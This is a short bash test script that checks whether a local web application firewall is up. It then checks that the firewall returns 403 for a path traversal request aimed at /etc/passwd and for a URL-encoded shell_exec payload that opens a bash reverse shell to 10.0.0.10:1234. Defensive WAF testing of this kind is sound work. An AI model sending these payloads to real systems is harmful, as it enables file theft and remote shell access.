#/bin/bash
echo "[ ] Checking if our WAF is up."
for I in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
do
	http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=HelloWorld" -s -f -w %{http_code} -m 1 -o /dev/null)
	if (($http_code == 404)); then 
	echo "    [+] We got a $http_code. This is correct since we dont host any files.";
		break
  	fi
	echo "    [!] We got a $http_code. Our WAF seems to be down. Check $I out of 20"; 
	sleep 1s
	if (($I == 5)); then
		echo "[ ] 	"	
		echo "    [!] Check counter $I out of 20. Killing test."; 		
		exit 200; 
	fi	
done
echo "[x] Our WAF is up!"; 
echo "[ ] Checking Path Traversal"
path_traversal_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=../../../etc/passwd" -s -f -w %{http_code} -m 10 -o /dev/null)
if (($path_traversal_http_code == 403)); then 
	echo "    [+] We got a $path_traversal_http_code on Path Traversal #01." ; 
else 
	echo "    [!] We got a $path_traversal_http_code on Path Traversal #01.";
	echo "[!] Our WAF did NOT block all Path Traversal requests :("; 
	exit 201; 
fi
echo "[x] Our WAF blocked all Path Traversal requests, Noice!"
echo "[ ] Checking Shell Exec"
shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -m 10 -o /dev/null)
if (($shell_exec_http_code == 403)); then 
	echo "    [+] We got a $shell_exec_http_code on Shell Exec #01.";
else 
	echo "    [!] We got a $shell_exec_http_code on Shell Exec #01."; 
	echo "[x] Our WAF did NOT block the request :(";	
	exit 202; 
fi
echo "[x] Our WAF blocked all Shell Exec requests, Noice!"
echo ""
echo "[x] All tests succeded !"
echo ""
echo ""